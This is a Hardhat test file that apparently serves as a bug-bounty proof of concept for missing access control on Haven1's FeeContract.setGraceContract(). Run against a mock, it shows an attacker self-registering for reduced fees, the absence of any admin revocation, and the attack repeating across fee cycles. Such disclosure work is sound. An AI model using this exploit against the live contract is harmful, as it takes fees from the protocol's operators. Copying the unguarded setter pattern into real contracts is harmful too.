import { ethers } from "hardhat";
import { expect } from "chai";
import { MockFeeContract } from "../typechain-types";

/**
 * PoC: FeeContract.setGraceContract() Has No Access Control
 *
 * VULNERABILITY: Any address (attacker or arbitrary contract) can call
 * setGraceContract(true) on Haven1's FeeContract and self-register,
 * obtaining reduced application fees during grace periods without authorization.
 *
 * Deployed contract: 0x716ED8C844495aBf237C170E0a0a7b7a9566dBf6 (Ethereum mainnet)
 * Program: https://immunefi.com/bug-bounty/haven1/
 */
describe("Haven1 FeeContract — Permissionless setGraceContract PoC", function () {
  let feeContract: MockFeeContract;
  let deployer: any;
  let normalUser: any;
  let attacker: any;

  beforeEach(async function () {
    [deployer, normalUser, attacker] = await ethers.getSigners();

    const FeeContract = await ethers.getContractFactory("MockFeeContract");
    feeContract = (await FeeContract.deploy()) as MockFeeContract;
    await feeContract.waitForDeployment();
  });

  it("Normal user pays full fee; cannot self-reduce fee", async function () {
    const fee = await feeContract.connect(normalUser).getFee();
    expect(fee).to.equal(ethers.parseEther("2"), "Normal user should pay full fee");
  });

  it("EXPLOIT: Attacker self-registers as grace contract and pays reduced fee", async function () {
    // Step 1: Trigger a fee increase so _feePrior (2 H1) < _fee (3 H1)
    // Constructor sets _feePrior=1, _fee=2. After this: _feePrior=2, _fee=3. Grace period active.
    await feeContract.connect(deployer).triggerFeeUpdate(ethers.parseEther("3"));

    // Step 2: Normal user's fee
    const normalFee = await feeContract.connect(normalUser).getFee();
    console.log(`  Normal user fee:   ${ethers.formatEther(normalFee)} H1`);
    expect(normalFee).to.equal(ethers.parseEther("3")); // new fee = 3 H1

    // Step 3: Attacker calls setGraceContract(true) — NO permission check
    await expect(
      feeContract.connect(attacker).setGraceContract(true)
    ).to.not.be.reverted; // succeeds without error — this is the bug

    // Step 4: Verify self-registration succeeded
    const isRegistered = await feeContract.isGraceContract(attacker.address);
    expect(isRegistered).to.be.true;
    console.log(`  Attacker registered as grace contract: ${isRegistered}`);

    // Step 5: Attacker now pays reduced (prior) fee
    const attackerFee = await feeContract.connect(attacker).getFee();
    console.log(`  Attacker fee:      ${ethers.formatEther(attackerFee)} H1`);
    expect(attackerFee).to.equal(ethers.parseEther("2")); // pays PRIOR (lower) fee: 2 H1 vs 3 H1
    expect(attackerFee).to.be.lt(normalFee);

    const reduction = ((normalFee - attackerFee) * 100n) / normalFee;
    console.log(`  Fee reduction:     ${reduction}%`);
    console.log(`  ✓ Attacker obtained ${reduction}% fee reduction with zero authorization`);
  });

  it("Admin CANNOT revoke unauthorized grace registration (no revokeGraceContract function)", async function () {
    // Attacker self-registers
    await feeContract.connect(attacker).setGraceContract(true);
    expect(await feeContract.isGraceContract(attacker.address)).to.be.true;

    // There is no admin function to forcibly remove another address's grace status.
    // The only fix is a contract upgrade.
    // An attacker can also self-deregister and re-register freely.

    // Attacker can voluntarily deregister
    await feeContract.connect(attacker).setGraceContract(false);
    expect(await feeContract.isGraceContract(attacker.address)).to.be.false;

    // And re-register at will
    await feeContract.connect(attacker).setGraceContract(true);
    expect(await feeContract.isGraceContract(attacker.address)).to.be.true;

    console.log(`  ✓ Confirmed: no admin revocation path. Only fix is contract upgrade.`);
  });

  it("Unauthorized grace contract pays lower fee on each grace period (repeatable attack)", async function () {
    // Attacker registers once
    await feeContract.connect(attacker).setGraceContract(true);

    // Simulate multiple fee update cycles
    for (let i = 0; i < 3; i++) {
      const newFee = ethers.parseEther((2 + i * 0.5).toString());
      await feeContract.connect(deployer).triggerFeeUpdate(newFee);

      const normalFee = await feeContract.connect(normalUser).getFee();
      const attackerFee = await feeContract.connect(attacker).getFee();

      expect(attackerFee).to.be.lte(normalFee);
      console.log(`  Cycle ${i + 1}: normal=${ethers.formatEther(normalFee)} attacker=${ethers.formatEther(attackerFee)}`);
    }
    console.log(`  ✓ Attack persists across multiple fee update cycles`);
  });
});
